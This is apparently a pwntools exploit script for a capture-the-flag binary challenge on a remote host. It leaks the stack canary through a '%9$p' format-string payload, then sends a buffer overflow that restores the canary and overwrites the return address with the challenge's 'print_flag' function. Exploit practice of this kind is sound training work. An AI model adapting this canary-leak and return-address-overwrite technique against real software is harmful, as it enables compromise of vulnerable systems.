from pwn import *

elf = ELF('./task')
context.log_level = 'debug'

offset = 16 # buf size
args_th = 6 # Buf stands, 6 and 7 are buf because buf is 16 bytes long

# First payload to leak canary
payload = b'%9$p'

# proc = elf.process()
proc = remote('rivit.dev', 10015)
proc.sendlineafter(b'First: ', payload)
canary = proc.recvuntil(b'Second: ').split(b'S')[0].decode("utf-8")
canary = canary[2::]

canary = int(canary, 16)

print(f'Canary: {canary}')

# Second payload to overflow canary and return address
endbr = b'E' * 8 # Padding
payload = b''.join(
    [
        b'A' * offset,  # Padding to reach canary
        endbr,
        p64(canary),  # Canary
        b'B' * 8,  # Padding to reach return address
        p64(elf.symbols['print_flag'])  # Overwrite return address with win function
    ]
)
proc.sendline(payload)

proc.interactive()